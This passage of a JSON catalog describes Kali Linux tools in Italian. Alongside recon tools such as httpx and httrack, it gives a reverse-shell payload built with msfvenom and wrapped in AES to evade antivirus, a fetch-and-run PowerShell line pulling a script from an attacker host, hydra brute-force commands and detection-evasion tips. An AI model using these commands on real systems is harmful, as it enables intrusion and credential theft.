penetration test, HTTProbe aiuta a costruire l'inventario dei servizi web esposti, inclusi quelli su porte non standard che potrebbero sfuggire a una scansione limitata alle porte 80 e 443. Questa mappatura e il prerequisito per l'identificazione delle tecnologie in uso e la ricerca di vulnerabilita specifiche.</p><p>Per attivita di <strong>Continuous Monitoring</strong> della superficie di attacco, HTTProbe puo essere schedulato periodicamente per verificare la comparsa di nuovi servizi web nell'infrastruttura, alimentando un sistema di alerting che notifica il team di sicurezza quando vengono esposti nuovi endpoint HTTP.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> HTTProbe effettua connessioni HTTP/HTTPS dirette a ciascun dominio nella lista, generando entry nei log dei web server target. Il pattern di connessioni rapide e sequenziali da un singolo IP e riconoscibile come attivita di scanning automatizzato. Il User-Agent di default potrebbe essere identificato come tool di security, sebbene sia basato sulla libreria HTTP standard di Go.</p><p><strong>Impatto operativo:</strong> Su liste molto grandi, HTTProbe genera un volume significativo di traffico di rete che puo attivare sistemi di rate limiting o ban temporanei. Le connessioni fallite su domini inesistenti generano query DNS che possono essere monitorate. In ambienti con CDN come Cloudflare, il probing potrebbe essere aggregato e rilevato come scansione.</p><p><strong>Mitigazioni:</strong> Utilizzare il flag di concorrenza (-c) per limitare il numero di connessioni simultanee e ridurre la visibilita. Instradare il traffico attraverso proxy rotanti per distribuire le connessioni su piu IP sorgente. Combinare con un resolver DNS personalizzato per evitare di rivelare i target al provider DNS. Operare durante orari di alto traffico per mimetizzare l'attivita.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "httpx-toolkit",
    "name": "httpx-toolkit",
    "version": "1.1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/httpx-toolkit/",
    "desc": "HTTP probe velocissimo con estrazione titolo, status code, tecnologie e screenshot.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>httpx</strong> e un toolkit HTTP multi-funzione sviluppato da ProjectDiscovery, progettato per condurre probe HTTP/HTTPS su larga scala con estrazione simultanea di metadati ricchi da ogni endpoint raggiunto. Rappresenta l'evoluzione moderna di strumenti come httprobe, combinando la verifica di raggiungibilita con il fingerprinting delle tecnologie web, l'estrazione di titoli e status code, la cattura di screenshot e molto altro in un singolo passaggio. La velocita eccezionale e garantita dall'implementazione in Go con goroutine concorrenti, permettendo di processare migliaia di URL al minuto. Httpx si integra nativamente con l'ecosistema ProjectDiscovery (subfinder, nuclei, katana) e supporta output strutturati in JSON e CSV che facilitano l'analisi automatizzata. E diventato uno strumento imprescindibile nelle pipeline di bug bounty e penetration testing moderno, sostituendo progressivamente tool piu datati grazie alla sua versatilita e alle continue aggiunte di funzionalita.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Probe Multi-Protocollo con Metadata Extraction:</strong> httpx non si limita a verificare se un host risponde, ma estrae simultaneamente una ricchezza di informazioni per ogni endpoint: status code HTTP, titolo della pagina, content-length, content-type, header del server, catena di redirect, certificato TLS con date di scadenza e issuer, hash del body e molto altro. Ogni probe produce un record completo che elimina la necessita di tool separati per ciascuna informazione, riducendo drasticamente il traffico complessivo verso il target.</p><p><strong>Technology Detection Integrata:</strong> Tramite l'integrazione nativa con le signature Wappalyzer, httpx identifica automaticamente le tecnologie web in uso su ciascun endpoint, inclusi framework (React, Angular, Django), CMS (WordPress, Joomla), web server, librerie JavaScript, sistemi di analytics e piattaforme e-commerce. Questa funzionalita trasforma un semplice probe in un asset inventory dettagliato che guida le successive fasi di vulnerability assessment.</p><p><strong>Screenshot Automatici e Similarity Hashing:</strong> httpx puo catturare screenshot di ogni pagina web visitata, producendo immagini che permettono una rapida triage visiva di grandi quantita di endpoint. Il sistema di similarity hashing permette di raggruppare pagine visivamente simili (come pagine di default o pannelli di login identici), facilitando l'identificazione di target unici e interessanti in dataset molto ampi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>httpx si utilizza tipicamente in combinazione con tool di subdomain enumeration come input e scanner di vulnerabilita come output, fungendo da hub centrale nella pipeline di reconnaissance.</p><pre><code># Probe base con titolo, status code e tech detection\ncat subdomains.txt | httpx -title -status-code -tech-detect\n\n# Output JSON completo per analisi automatizzata\nhttpx -l urls.txt -json -o results.json \\\n  -title -status-code -content-length -tech-detect -cdn\n\n# Screenshot automatici di tutti gli endpoint\nhttpx -l targets.txt -screenshot -screenshot-timeout 10 \\\n  -system-chrome -store-response-dir ./responses\n\n# Pipeline completa: discovery -> enrich -> scan\nsubfinder -d target.com -silent | httpx -silent | nuclei\n\n# Filtro per status code e tecnologia\ncat urls.txt | httpx -mc 200 -tech-detect | grep WordPress\n\n# Probe su porte multiple\nhttpx -l hosts.txt -ports 80,443,8080,8443,3000</code></pre><p>Per dataset molto grandi, e consigliabile utilizzare il flag -rate-limit per controllare il numero di richieste al secondo e il flag -threads per gestire la concorrenza. L'output JSON e particolarmente utile per alimentare database o dashboard di asset management.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Bug Bounty</strong>, httpx e lo strumento principale per arricchire e filtrare i risultati di subdomain enumeration, trasformando una semplice lista di domini in un database strutturato con tecnologie, titoli e status code che guida la prioritizzazione dei target. La capacita di processare migliaia di URL in minuti e di identificare automaticamente le tecnologie riduce drasticamente il tempo necessario per la fase di reconnaissance.</p><p>Per l'<strong>Asset Discovery e Inventory</strong> in ambito enterprise, httpx permette di mappare rapidamente tutti i servizi web esposti nell'infrastruttura, producendo un inventario completo con tecnologie in uso, certificati TLS e metadati che alimenta processi di vulnerability management e compliance. La ripetizione periodica della scansione evidenzia cambiamenti nell'infrastruttura.</p><p>Durante il <strong>Continuous Security Monitoring</strong>, httpx viene schedulato per verificare periodicamente l'emergere di nuovi servizi, cambiamenti nelle tecnologie in uso o scadenza di certificati TLS, generando alert automatici per il team di sicurezza quando vengono rilevate anomalie rispetto alla baseline.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> httpx effettua connessioni HTTP dirette con un User-Agent che per default identifica il tool (personalizzabile con -H). Le richieste includono path specifici per la technology detection che possono essere rilevati da WAF. Il pattern di connessioni rapide e sistematiche e distinguibile dal traffico utente normale nei log dei web server.</p><p><strong>Impatto operativo:</strong> Su target con rate limiting aggressivo, httpx puo essere rallentato o bloccato. La funzionalita screenshot richiede un browser Chrome/Chromium installato e consuma risorse significative. L'alto volume di richieste su grandi liste puo generare alert in sistemi di monitoring di rete e security information management.</p><p><strong>Mitigazioni:</strong> Personalizzare il User-Agent per mimetizzarsi come browser legittimo. Utilizzare -rate-limit per controllare il throughput e ridurre la visibilita. Instradare il traffico attraverso proxy rotanti quando possibile. Eseguire screenshot solo su target gia filtrati e prioritizzati per ridurre il tempo di esposizione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "httrack",
    "name": "httrack",
    "version": "3.49.6",
    "icon": "../app/icons/httrack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/httrack/",
    "desc": "Web crawler per download offline di siti completi mantenendo struttura link.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HTTrack</strong> e un website copier open source che permette di scaricare interi siti web per la consultazione offline, mantenendo fedelmente la struttura originale dei link, le risorse grafiche, i fogli di stile e gli script. Il tool esegue un crawling ricorsivo del sito target, scaricando ogni pagina HTML e le risorse collegate (immagini, CSS, JavaScript, documenti), quindi riscrive automaticamente tutti gli URL assoluti in percorsi relativi per garantire la navigabilita completa del sito dal filesystem locale. HTTrack e altamente configurabile, permettendo di definire filtri per estensione, dimensione, profondita di ricorsione e domini consentiti, ed e in grado di riprendere download interrotti mantenendo lo stato della sessione. Oltre alla versione da linea di comando, include un'interfaccia grafica (WebHTTrack) accessibile via browser. Nel contesto della sicurezza informatica, HTTrack e prezioso per l'analisi offline di siti target, la preservazione di evidence digitali e lo studio della struttura e dei contenuti senza generare traffico continuo verso il server.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Mirror Ricorsivo Completo:</strong> HTTrack naviga ricorsivamente tutte le pagine del sito target seguendo i link interni, scaricando ogni risorsa collegata e ricostruendo fedelmente l'albero delle directory. Il motore di crawling gestisce correttamente redirect, frame, contenuti generati da JavaScript di base e risorse embeddate in CSS. La profondita di ricorsione e configurabile, permettendo di limitare il download a specifiche sezioni del sito o di scaricarlo interamente senza limiti.</p><p><strong>Filtri Avanzati e Regole di Inclusione/Esclusione:</strong> Il sistema di filtri di HTTrack permette un controllo granulare su quali risorse vengono scaricate, utilizzando pattern basati su estensione (+*.html, -*.zip), percorso (+/blog/*, -/admin/*), dimensione massima e dominio. E possibile configurare regole per seguire link verso domini esterni specifici o limitare rigorosamente il download al dominio principale, e definire limiti di bandwidth per non saturare la connessione o sovraccaricare il server target.</p><p><strong>Gestione Sessione e Resume:</strong> HTTrack mantiene un database interno dello stato del download che permette di riprendere sessioni interrotte esattamente dal punto in cui si erano fermate, senza dover riscaricare risorse gia ottenute. Questa funzionalita e particolarmente utile per mirror di siti di grandi dimensioni che richiedono ore o giorni per il completamento. La modalita update permette inoltre di aggiornare un mirror esistente scaricando solo le risorse modificate dal download precedente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>HTTrack puo essere utilizzato sia da linea di comando per automazione e scripting, sia tramite l'interfaccia web WebHTTrack per una configurazione piu intuitiva.</p><pre><code># Mirror semplice di un sito\nhttrack https://target.com -O ./mirror_output\n\n# Con profondita di ricorsione limitata a 3 livelli\nhttrack https://target.com -O ./mirror -r3\n\n# Solo pagine HTML e immagini, escludendo file pesanti\nhttrack https://target.com -O ./mirror +*.html +*.jpg +*.png +*.css -*.zip -*.pdf\n\n# Limitare bandwidth a 50KB/s e connessioni\nhttrack https://target.com -O ./mirror --max-rate=50000 -%c2\n\n# Riprendere download interrotto\nhttrack --continue -O ./mirror\n\n# Interfaccia grafica via browser\nwebhttrack</code></pre><p>Per siti protetti da autenticazione, e possibile specificare cookie o credenziali HTTP basic tramite parametri dedicati. E importante rispettare i limiti legali e le condizioni di utilizzo del sito target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per la <strong>raccolta e preservazione di Evidence Digitali</strong>, HTTrack crea una copia completa e navigabile del sito web in un momento specifico nel tempo, utile come prova in indagini forensi o contestazioni legali. La copia offline garantisce che i contenuti siano preservati anche se il sito viene successivamente modificato o rimosso, fornendo una baseline documentata dello stato del sito.</p><p>Nell'<strong>Analisi Offline durante Penetration Testing</strong>, il mirror del sito target permette di studiare approfonditamente la struttura dell'applicazione, identificare endpoint nascosti, analizzare il codice JavaScript e cercare informazioni sensibili nei commenti HTML senza generare traffico continuo verso il server. Questo approccio riduce la visibilita dell'attivita di reconnaissance e permette un'analisi piu metodica.</p><p>Per il <strong>Content Discovery e Information Gathering</strong>, l'analisi offline del sito scaricato con tool come grep permette di cercare rapidamente pattern come indirizzi email, percorsi API, chiavi di configurazione, commenti di sviluppo e altri dati sensibili nascosti nel codice sorgente delle pagine, senza dover effettuare ripetute richieste al server.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il crawling di HTTrack genera un volume elevato di richieste HTTP sequenziali con pattern riconoscibile come attivita di mirroring automatizzato. Il User-Agent di default identifica esplicitamente il tool (\"HTTrack\"), facilitando il rilevamento nei log del server. Molti CDN e WAF hanno regole specifiche per bloccare web scraper e mirror tool basandosi su pattern di comportamento e User-Agent.</p><p><strong>Impatto operativo:</strong> Il download completo di un sito puo generare centinaia o migliaia di richieste in breve tempo, potenzialmente sovraccaricando il server o attivando meccanismi di rate limiting e ban IP. Per default HTTrack rispetta le direttive robots.txt, che potrebbero limitare l'accesso a sezioni interessanti del sito. La dimensione del mirror puo essere significativa per siti con molte risorse multimediali.</p><p><strong>Mitigazioni:</strong> Personalizzare il User-Agent per mimetizzarsi come un browser comune. Utilizzare rate limiting (--max-rate) per ridurre il carico sul server e la visibilita nei log. Limitare la profondita e i filtri al minimo necessario per l'analisi. Operare durante orari di alto traffico per diluire le richieste. Considerare l'uso di wget con opzioni di mirror come alternativa con User-Agent meno riconoscibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
    "id": "humble",
    "name": "humble",
    "version": "1.52",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/humble/",
    "desc": "Analizza header HTTP per trovare misconfiguration e security header mancanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Humble</strong> è un analizzatore specializzato di HTTP security header che verifica la presenza e la corretta configurazione degli header di sicurezza delle applicazioni web. Controlla header critici come Content-Security-Policy (CSP), HTTP Strict-Transport-Security (HSTS), X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy e molti altri. Fornisce un rating complessivo della postura di sicurezza e raccomandazioni dettagliate basate su best practice OWASP per correggere le misconfigurazioni identificate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive Header Analysis:</strong> verifica tutti i security header standard e moderni inclusi CSP, HSTS, X-Frame-Options, X-Content-Type-Options, X-XSS-Protection, Referrer-Policy, Permissions-Policy, Cross-Origin headers e cookie security flags.</p><p><strong>Security Scoring System:</strong> calcola un punteggio complessivo della sicurezza degli header basato sulla presenza, configurazione e valore di ogni header, permettendo comparazione tra applicazioni e tracking dei miglioramenti.</p><p><strong>Actionable Recommendations:</strong> fornisce suggerimenti specifici e dettagliati per ogni header mancante o misconfigured, con valori raccomandati e spiegazioni del rischio associato alla mancanza.</p><p><strong>Multiple Export Formats:</strong> genera report in JSON, CSV, HTML e altri formati per integrazione in pipeline CI/CD, dashboard di security e documentazione di assessment.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi base di un sito\nhumble https://target.com\n\n# Output dettagliato con spiegazioni\nhumble -u https://target.com -v\n\n# Analisi di lista URL\nhumble -l urls.txt\n\n# Export in formato JSON\nhumble -u https://target.com -o json\n\n# Export HTML per report\nhumble -u https://target.com -o html &gt; report.html\n\n# Solo header specifici\nhumble -u https://target.com --headers csp,hsts\n\n# Ignora certificati SSL invalidi\nhumble -u https://target.com -k\n\n# Con timeout custom\nhumble -u https://target.com --timeout 30</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Application Security Assessment</strong>, verificare rapidamente la configurazione dei security header come parte di un penetration test, identificando protezioni mancanti contro clickjacking, XSS, MIME sniffing e altri attacchi.</p><p>Per <strong>Compliance Auditing</strong>, verificare che le applicazioni web rispettino requisiti di security header definiti da policy aziendali, standard di settore (PCI-DSS) o best practice OWASP.</p><p>Per <strong>Bug Bounty Hunting</strong>, identificare misconfigurazioni di security header che possono essere sfruttate o che indicano una postura di sicurezza debole meritevole di ulteriore investigazione.</p><p>Per <strong>CI/CD Security Gates</strong>, integrare in pipeline di deployment per verificare automaticamente che nuove release mantengano security header corretti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive Analysis:</strong> esegue solo richieste HTTP HEAD/GET standard identiche a quelle di un normale browser, generando minimo footprint e traffico non distinguibile dalla normale navigazione. Non invasivo, non richiede autenticazione e non modifica nulla sul target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "hrepo",
    "name": "hrepo",
    "version": "2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hrepo/",
    "desc": "Enumera repository Git esposti pubblicamente su server web per leak di codice sorgente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HRepo</strong> è un tool specializzato per scoprire e analizzare repository Git esposti pubblicamente su server web. Cerca directory .git accessibili via HTTP che non dovrebbero essere pubbliche - un errore di deployment sorprendentemente comune che può esporre l'intero codice sorgente dell'applicazione, cronologia completa dei commit con tutti i file mai esistiti (anche cancellati), credenziali hardcoded, chiavi API, configurazioni sensibili e informazioni sulla struttura interna del progetto. Una singola .git esposta può compromettere completamente la sicurezza di un'applicazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Git Directory Detection:</strong> identifica directory .git accessibili via HTTP testando path caratteristici come .git/HEAD, .git/config e .git/index, distinguendo tra esposizioni complete e parziali.</p><p><strong>Full Repository Reconstruction:</strong> scarica tutti gli oggetti Git (blob, tree, commit) e ricostruisce il repository completo localmente, permettendo checkout del codice sorgente attuale e di tutti i branch.</p><p><strong>History Extraction:</strong> recupera l'intera cronologia dei commit permettendo di accedere a file cancellati, versioni precedenti e modifiche che potrebbero contenere credenziali successivamente rimosse ma ancora presenti nella history.</p><p><strong>Automated Secrets Analysis:</strong> analizza il repository scaricato per pattern di credenziali, API key, password, token e altri secrets comunemente hardcodati nel codice sorgente o nei file di configurazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Check singolo target per .git esposta\nhrepo -u https://target.com\n\n# Scan di lista URL\nhrepo -l urls.txt\n\n# Dump completo del repository\nhrepo -u https://target.com --dump\n\n# Con analisi automatica di secrets\nhrepo -u https://target.com --dump --secrets\n\n# Output in formato JSON\nhrepo -u https://target.com -o json\n\n# Dopo il dump, analizza localmente\ncd dumped_repo/\ngit log --all --oneline\ngit show &lt;commit&gt;\ngit diff HEAD~10\n\n# Cerca secrets con truffleHog\ntrufflehog filesystem ./dumped_repo/\n\n# Cerca pattern sensibili\ngrep -r \"password\\|api_key\\|secret\" ./dumped_repo/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Bug Bounty Hunting</strong>, trovare source code disclosure via .git esposta è una vulnerabilità comune e di alto impatto, spesso premiata con bounty significativi per l'accesso al codice sorgente.</p><p>Per <strong>Penetration Testing</strong>, accedere a credenziali, API key e configurazioni presenti nel repository può fornire accesso diretto a database, servizi cloud e sistemi backend.</p><p>Per <strong>OSINT &amp; Code Review</strong>, analizzare il codice sorgente per comprendere la logica applicativa, identificare vulnerabilità nel codice e mappare l'architettura interna del target.</p><p>Per <strong>Historical Analysis</strong>, recuperare file e credenziali cancellati che esistono ancora nella Git history, spesso contenenti secrets che gli sviluppatori credevano rimossi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active Scanning:</strong> le richieste HTTP a path .git/* sono riconoscibili e possono essere loggate. Il download completo del repository genera traffico significativo. Alcuni WAF bloccano accesso a .git/. Pattern di accesso sequenziale agli oggetti Git è identificabile come reconnaissance.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Git_Recon"
    ],
    "notes": null
  },
  {
    "id": "hydra-kali",
    "name": "hydra",
    "version": "9.5",
    "icon": "../app/icons/hydra-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hydra/",
    "desc": "Brute forcer veloce e parallelo per 50+ protocolli: SSH, FTP, HTTP, RDP, SMB, MySQL.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hydra</strong> (THC Hydra) è il password cracker online più completo, veloce e versatile disponibile. Supporta oltre 50 protocolli di rete e applicativi tra cui SSH, FTP, Telnet, HTTP/HTTPS (form, basic, digest), RDP, VNC, SMB, MySQL, MSSQL, PostgreSQL, Oracle, LDAP, IMAP, POP3, SMTP e molti altri. Utilizza attacchi dizionario con threading parallelo massivo per testare migliaia di combinazioni al minuto. È lo strumento di riferimento per password auditing e credential testing durante penetration test.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>50+ Protocol Support:</strong> supporta nativamente la maggior parte dei protocolli di autenticazione di rete e applicativi, con moduli specifici ottimizzati per ogni servizio e gestione automatica delle peculiarità di ogni protocollo.</p><p><strong>Massive Parallelism:</strong> architettura multi-thread che permette centinaia di connessioni parallele configurabili, massimizzando la velocità di testing nel rispetto dei limiti del target e della rete.</p><p><strong>Flexible Input Sources:</strong> accetta username e password singoli, liste da file, generazione combinatoria e supporta formati di input per combo files (user:pass), permettendo strategie di attacco flessibili.</p><p><strong>Session Resume:</strong> salva automaticamente lo stato dell'attacco permettendo di riprendere sessioni interrotte dal punto esatto di interruzione, essenziale per wordlist massive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SSH brute force con wordlist\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com\n\n# HTTP POST form login\nhydra -l admin -P pass.txt target.com http-post-form \"/login:user=^USER^&amp;pass=^PASS^:F=Login failed\"\n\n# RDP con lista utenti e password\nhydra -L users.txt -P passwords.txt rdp://target.com\n\n# SMB/Windows authentication\nhydra -L users.txt -P pass.txt smb://target.com\n\n# FTP con rate limiting\nhydra -l anonymous -P pass.txt -t 4 -W 2 ftp://target.com\n\n# MySQL database\nhydra -l root -P pass.txt mysql://target.com\n\n# HTTP Basic Auth\nhydra -l admin -P pass.txt target.com http-get /admin/\n\n# Con output file e verbose\nhydra -l admin -P pass.txt -o results.txt -V ssh://target.com\n\n# Resume sessione interrotta\nhydra -R\n\n# Password spray (una password, molti utenti)\nhydra -L users.txt -p 'Summer2024!' ssh://target.com -t 1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Penetration Testing</strong>, testare password policy e identificare credenziali deboli o di default su servizi esposti, validando la robustezza dei controlli di autenticazione.</p><p>Per <strong>Password Spraying</strong>, testare password comuni (stagione+anno, Company123) contro molti account con rate limiting per evitare lockout, tecnica efficace contro Active Directory.</p><p>Per <strong>CTF Competitions</strong>, cracking rapido di servizi con autenticazione durante challenge di sicurezza dove la velocità è critica.</p><p>Per <strong>Security Compliance Audit</strong>, verificare che non esistano credenziali di default, password deboli o account con password comuni in violazione delle policy aziendali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Molto Rumoroso:</strong> genera migliaia di tentativi di login che sono facilmente rilevabili da IDS, SIEM e sistemi di monitoring. Causa lockout degli account se le policy lo prevedono. Usare rate limiting (-t per thread, -W per wait) e considerare password spraying invece di brute force tradizionale. Coordinare con il cliente per evitare disruption durante pentest.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "hyperion",
    "name": "hyperion",
    "version": "2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hyperion/",
    "desc": "Runtime encrypter per PE files Windows che bypassa AV con encryption AES.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hyperion</strong> è un runtime crypter per eseguibili Windows PE (Portable Executable) che cripta il payload con AES-128 e genera un wrapper auto-decrittante. Il file risultante contiene il payload cifrato e uno stub che, a runtime, decripta il codice originale in memoria ed esegue il programma. Questa tecnica rende inefficace la detection basata su signature statiche, poiché il pattern del malware originale è nascosto dalla crittografia fino al momento dell'esecuzione. È uno strumento classico per AV evasion, sebbene le moderne soluzioni EDR con analisi comportamentale ne limitino l'efficacia.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AES-128 Encryption:</strong> cripta l'intero eseguibile PE originale con AES-128 usando una chiave generata casualmente, nascondendo completamente il contenuto originale incluse tutte le stringhe e signature identificabili.</p><p><strong>Runtime In-Memory Decryption:</strong> lo stub decripta il payload direttamente in memoria a runtime senza mai scrivere il file originale su disco, evitando detection da scansioni filesystem.</p><p><strong>Self-Contained Stub:</strong> genera un eseguibile completamente autonomo che include stub di decrittazione, payload cifrato e chiave, senza dipendenze esterne o necessità di file aggiuntivi.</p><p><strong>PE Format Preservation:</strong> mantiene la struttura PE valida nell'output permettendo esecuzione normale su Windows, con supporto per PE32 e PE32+ (x86 e x64).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cripta un eseguibile con Hyperion (richiede Wine su Linux)\nwine /usr/share/windows-resources/hyperion/hyperion.exe payload.exe crypted.exe\n\n# Verifica che l'output sia un PE valido\nfile crypted.exe\n\n# Workflow tipico per payload Metasploit:\n# 1. Genera payload\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe\n\n# 2. Cripta con Hyperion\nwine /usr/share/windows-resources/hyperion/hyperion.exe payload.exe crypted.exe\n\n# 3. Verifica detection (opzionale)\n# Upload su VirusTotal o test con AV locale\n\n# 4. Delivery al target\n# Hosting su web server, phishing, USB drop, etc.\n\n# Compilare Hyperion da sorgente (per modifiche)\n# Richiede MinGW cross-compiler\ni686-w64-mingw32-gcc hyperion.c -o hyperion.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team AV Evasion</strong>, bypassare antivirus signature-based durante engagement permettendo delivery di payload custom senza detection iniziale.</p><p>Per <strong>Payload Obfuscation</strong>, nascondere la natura del payload durante il trasferimento e storage, rivelando il contenuto solo al momento dell'esecuzione in memoria.</p><p>Per <strong>AV/EDR Testing</strong>, verificare le capacità di detection delle soluzioni di sicurezza endpoint testandole contro payload criptati e tecniche di evasion note.</p><p>Per <strong>Security Research</strong>, studiare tecniche di runtime encryption e come le soluzioni di sicurezza rispondono a payload offuscati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection Limitations:</strong> Hyperion stesso e il suo stub sono noti e flaggati da molti AV moderni. La detection comportamentale e l'analisi euristica degli EDR possono rilevare il payload dopo la decrittazione in memoria. Lo stub genera pattern riconoscibili durante l'esecuzione. Per evasion efficace su target protetti, considerare crypter custom o tecniche più avanzate. Tool principalmente educativo su come funziona il runtime encryption.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "ibombshell",
    "name": "ibombshell",
    "version": "0~git20201107",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ibombshell/",
    "desc": "Post-exploitation tool con PowerShell e Python per operazioni su sistemi compromessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>iBombShell</strong> è un framework di post-exploitation modulare che opera tramite PowerShell (Windows) e Python (cross-platform). Fornisce una shell interattiva potenziata per operazioni su sistemi compromessi, con architettura modulare che permette di caricare dinamicamente funzionalità aggiuntive. Può operare in due modalità: \"everywhere\" (completamente fileless, eseguito in memoria) o \"console\" (con server C2 dedicato per controllo centralizzato di multiple sessioni). Sviluppato da ElevenPaths/Telefónica, combina semplicità d'uso con funzionalità avanzate di post-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fileless Execution Mode:</strong> la modalità \"everywhere\" esegue interamente in memoria PowerShell senza scrivere file su disco, riducendo gli artefatti forensi e bypassando controlli basati su file system.</p><p><strong>Dynamic Module Loading:</strong> architettura modulare che permette di caricare funzionalità on-demand (credential dumping, privilege escalation, lateral movement) senza includere tutto il codice nel payload iniziale.</p><p><strong>Cross-Platform Support:</strong> client PowerShell per Windows con piena integrazione con l'ecosistema Windows/AD, e client Python per operazioni su Linux e macOS.</p><p><strong>C2 Console Server:</strong> server di comando e controllo Python che gestisce multiple sessioni, permette esecuzione di comandi su tutti gli agent e fornisce logging centralizzato delle operazioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia console server C2\npython3 ibombshell.py\n\n# Client PowerShell - everywhere mode (fileless)\n# Esegui sul target Windows:\niex(new-object net.webclient).downloadstring('http://attacker:8080/ibombshell.ps1')\n\n# Comandi disponibili nella shell:\nhelp                    # Lista comandi disponibili\nload-functions          # Carica moduli aggiuntivi\nget-system              # Privilege escalation\ndump-credentials        # Estrai credenziali\nget-info                # System information\nbypass-uac              # UAC bypass\ninvoke-mimikatz        # Integrazione Mimikatz\nget-process             # Lista processi\nget-services            # Lista servizi\n\n# Modalità silentmode\nset-silentmode on\n\n# Lateral movement\ninvoke-psremoting -target 192.168.1.100 -command \"whoami\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team Operations</strong>, condurre post-exploitation fileless su sistemi Windows minimizzando gli artefatti forensi e mantenendo persistenza in memoria.</p><p>Per <strong>Penetration Testing</strong>, eseguire operazioni standard di post-exploitation (enumeration, credential harvesting, privilege escalation) con un framework unificato e modulare.</p><p>Per <strong>Lateral Movement</strong>, utilizzare i moduli integrati per spostarsi tra sistemi Windows sfruttando credenziali raccolte, WMI, PSRemoting e altre tecniche.</p><p>Per <strong>Multi-Target Management</strong>, controllare multiple sessioni compromesse da una singola console C2 per operazioni coordinate su larga scala.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection Vectors:</strong> PowerShell Script Block Logging e Module Logging catturano i comandi eseguiti. AMSI (Antimalware Scan Interface) può rilevare payload noti - necessario bypass. Il traffico C2 HTTP è identificabile da proxy e IDS. Le operazioni in memoria sono comunque visibili a EDR avanzati tramite ETW e memory scanning. Considerare obfuscation e AMSI bypass per ambienti protetti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
